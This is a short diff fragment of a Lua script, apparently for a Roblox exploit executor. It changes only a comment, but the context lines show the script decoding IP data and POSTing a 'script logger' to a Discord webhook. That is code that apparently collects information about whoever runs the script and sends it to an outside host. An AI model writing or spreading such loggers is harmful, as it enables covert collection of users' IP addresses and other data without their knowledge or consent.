@@ -9,7 +9,7 @@ local response = http_request({
 
 local ipData = HttpService:JSONDecode(response.Body)
 
--- Send the script logger to Discord
+-- Send the skid script logger to Discord
 http_request({
     Url = webhookURL,
     Method = "POST",
